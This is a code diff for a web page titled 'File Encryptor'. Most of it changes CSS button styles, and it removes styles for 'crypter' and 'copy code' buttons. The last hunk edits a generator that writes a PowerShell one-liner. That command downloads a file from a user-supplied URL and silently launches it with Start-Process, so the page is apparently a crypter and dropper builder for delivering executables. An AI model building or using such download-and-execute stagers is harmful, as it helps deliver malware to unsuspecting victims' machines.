@@ -6,69 +6,36 @@
     <title>File Encryptor</title>
     <style>
         body {
-    font-family: Arial, sans-serif;
-    background-image: url('IMG_5286.jpeg'); /* Set the background image */
-    background-size: cover; /* Cover the entire background */
-    background-position: center; /* Center the image */
-    color: purple; /* Set text color to purple */
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    padding: 20px;
-    text-align: center;
-}
-button {
-    padding: 15px 30px;
-    font-size: 18px;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    margin: 10px;
-    background-color: red; /* Set button color to red */
-    color: purple; /* Set button text color to purple */
-    transition: background-color 0.3s;
-}
-button:hover {
-    background-color: darkred; /* Darker red on hover */
-}
-
-        #choose-file-button {
-            background-color: #ff69b4; /* Pink theme */
-            color: white;
+            font-family: Arial, sans-serif;
+            background-image: url('IMG_5286.jpeg'); /* Set the background image */
+            background-size: cover; /* Cover the entire background */
+            background-position: center; /* Center the image */
+            color: purple; /* Set text color to purple */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
         }
-        #choose-file-button:hover {
-            background-color: #ff1493; /* Darker pink on hover */
+        h1 {
+            margin-bottom: 30px;
         }
-        #encrypt-button {
-            background-color: #000; /* Black theme */
-            color: white;
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            background-color: red; /* Set button color to red */
+            color: purple; /* Set button text color to purple */
+            transition: background-color 0.3s;
         }
-        #encrypt-button:hover {
-            background-color: #333; /* Darker black on hover */
-        }
-        #crypter-button {
-            background-color: #ff4500; /* Orange theme */
-            color: white;
-        }
-        #crypter-button:hover {
-            background-color: #ff6347; /* Darker orange on hover */
-        }
-        #encrypted-file-button {
-            background-color: #1e90ff; /* Blue theme */
-            color: white;
-        }
-        #encrypted-file-button:hover {
-            background-color: #00bfff; /* Darker blue on hover */
-        }
-        #copy-code-button {
-            background-color: #808080; /* Grey theme */
-            color: white;
-        }
-        #copy-code-button:hover {
-            background-color: #696969; /* Darker grey on hover */
+        button:hover {
+            background-color: darkred; /* Darker red on hover */
         }
         input[type="file"] {
             display: none; /* Hides the file input */
@@ -138,7 +105,6 @@ button:hover {
             if (this.files.length > 0) {
                 selectedFile = this.files[0]; // Store the selected file
                 fileNameDisplay.textContent = "Selected file: " + selectedFile.name;
-                document.getElementById("base64-output").textContent = "Base64 Encoded File: Click to Generate"; // Reset output
             } else {
                 fileNameDisplay.textContent = "No file chosen";
             }
@@ -223,15 +189,15 @@ button:hover {
         // Generate PowerShell script
         function generatePSScript() {
             const path = document.getElementById("ps-input").value;
-            if (!path) {
-                alert("Please enter a link or path.");
+            if (!path || !selectedFile) {
+                alert("Please enter a link or path and choose a file.");
                 return;
             }
 
             const psCode = `
                 $client = New-Object System.Net.WebClient;
-                $client.DownloadFile("${path}", "downloaded.exe");
-                Start-Process "downloaded.exe" -ArgumentList '/silent' -NoNewWindow;
+                $client.DownloadFile("${path}", "${selectedFile.name}");
+                Start-Process "${selectedFile.name}" -ArgumentList '/silent' -NoNewWindow;
             `;
             document.getElementById("ps-output").textContent = "PowerShell Code: " + psCode.trim(); // Show PowerShell code
         }
